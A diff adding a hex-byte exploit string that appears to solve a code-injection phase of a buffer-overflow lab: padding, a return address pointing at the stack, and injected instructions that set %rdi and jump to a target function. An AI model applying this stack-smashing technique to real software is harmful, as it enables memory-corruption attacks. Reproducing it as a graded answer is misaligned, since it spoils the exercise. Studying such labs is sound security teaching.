@@ -1,0 +1,7 @@
+11 22 33 44 55 66 77 88 99 aa bb cc dd ee ff 00 11 22 33 44 55 66 77 88 99 aa bb cc dd ee ff 00 11 22 33 44 55 66 77 88 
+/* Return target is the stack address */
+a8 dc 61 55 00 00 00 00 
+/* Inserted code */
+48 c7 c7 fa 97 b9 59 /* mov 0x59b997fa , %rdi */
+68 ec 17 40 00       /* pushq 0x4017ec */
+c3                   /* retq */
